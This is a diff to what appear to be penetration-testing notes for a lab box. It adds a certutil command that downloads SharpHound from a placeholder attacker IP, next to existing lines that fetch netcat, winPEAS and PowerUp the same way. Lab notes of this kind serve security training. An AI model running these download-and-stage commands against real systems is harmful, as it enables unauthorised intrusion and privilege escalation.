@@ -9,6 +9,9 @@ DOWNLOAD THE FOLLOWING FILES
  - certutil -urlcache -split -f http://<attacker-ip>/nc.exe nc.exe
  - certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
  - certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1
+ - certutil -urlcache -split -f http://<attacker-ip>/sharphound.exe sharp.exe
+
+Sharphound should hold all of the AD enumeration needed for this box.
 
 After winPEAS enum try this enum techniques.
 
